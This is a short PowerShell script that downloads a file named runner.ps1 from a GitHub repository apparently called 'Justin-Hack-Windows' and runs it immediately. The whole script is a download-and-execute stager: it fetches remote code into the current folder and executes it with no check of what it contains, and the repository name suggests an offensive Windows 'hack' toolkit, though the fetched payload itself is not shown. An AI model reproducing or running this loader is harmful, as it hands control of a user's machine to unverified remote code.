# Get current dir
$dir = Get-Location

# URL to download
$url = "https://raw.githubusercontent.com/mxcezl/Justin-Hack-Windows/master/runner.ps1"

# Download file
$client = new-object System.Net.WebClient
$client.DownloadFile($url, "$dir\runner.ps1")

# Run file
& "$dir\runner.ps1"